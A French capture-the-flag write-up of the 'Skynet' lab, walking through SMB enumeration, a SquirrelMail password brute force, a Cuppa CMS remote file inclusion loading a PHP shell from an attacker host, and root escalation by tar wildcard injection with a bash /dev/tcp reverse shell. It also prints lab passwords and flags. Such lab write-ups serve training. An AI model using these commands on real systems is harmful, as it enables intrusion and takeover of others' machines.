Skynet

SMBSambaSquirrelMail RFITar WildcardCron

Enumération SMB pour récupérer une wordlist et un username. Bruteforce de SquirrelMail, découverte d'un mot de passe MySQL. Exploitation RFI sur Cuppa CMS. Escalade via Tar Wildcard Injection dans une tâche cron root.

Reconnaissance Nmap

bash 
nmap -sC -sV -A lab.thm

Services ouverts :

  • 22/tcp — SSH
  • 80/tcp — Apache (Skynet)
  • 110/tcp — POP3
  • 143/tcp — IMAP
  • 139/445/tcp — Samba / SMB

Enumération SMB

bash 
smbclient -L //lab.thm/ -N
milesdyson   anonymous   IPC$

smbclient //lab.thm/anonymous -N
smb> ls
smb> get attention.txt
smb> cd logs
smb> get log1.txt   # wordlist!

Depuis attention.txt : nom d'utilisateur milesdyson. log1.txt contient une wordlist de mots de passe.

SquirrelMail Bruteforce

bash 
ffuf -u http://lab.thm/squirrelmail/src/redirect.php \
  -d "login_username=milesdyson&secretkey=FUZZ&mailbox=INBOX" \
  -w log1.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 302
Mot de passe SquirrelMail : cyborg007haloterminator

Mail trouvé dans la boîte : mot de passe Samba )s{A&2Z=F^n_E.B`

Accès SMB milesdyson

bash 
smbclient //lab.thm/milesdyson \
  -U milesdyson%')s{A&2Z=F^n_E.B`'
smb> get important.txt

important.txt révèle un répertoire caché : /45kra24zxs28v3yd

RFI sur Cuppa CMS

bash 
gobuster dir -u http://lab.thm/45kra24zxs28v3yd \
  -w /usr/share/wordlists/dirb/common.txt
/administrator   # Cuppa CMS

Cuppa CMS est vulnérable à RFI via le paramètre urlConfig :

bash 
# Héberger un reverse shell PHP sur Kali :
python3 -m http.server 80

# URL RFI :
http://lab.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://KALI_IP/shell.php
User flag : 7ce5c2109a40f958099283600a9ae807

Escalade — Tar Wildcard Injection

La crontab root exécute une commande tar sur le home de milesdyson :

bash 
cat /etc/crontab
*/1 * * * * root /home/milesdyson/backups/backup.sh

cat /home/milesdyson/backups/backup.sh
cd /var/www/html && tar cf /home/milesdyson/backups/backup.tgz *

Le wildcard * de tar est exploitable. On crée des fichiers avec des noms spéciaux dans /var/www/html :

bash — Tar Wildcard Injection
cd /var/www/html

# 1. Créer le script reverse shell
echo 'bash -i >& /dev/tcp/KALI_IP/9999 0>&1' > shell.sh

# 2. "Fichiers" qui seront interprétés comme options tar
echo "" > "--checkpoint=1"
echo "" > '--checkpoint-action=exec=sh shell.sh'

# 3. Listener sur Kali
nc -lvnp 9999
# Attendre 1 minute → shell root !
Root flag : 3f0372db24753accc7179a282cd6a949

Leçons apprises

  • SMB anonyme = enumération inévitable — désactiver l'accès anonyme en prod
  • Les RFI nécessitent que allow_url_include soit activé dans PHP (mauvaise conf)
  • Tar avec wildcard dans une crontab root = privesc classique à mémoriser
  • Créer des fichiers nommés comme des options CLI = une technique puissante et méconnue
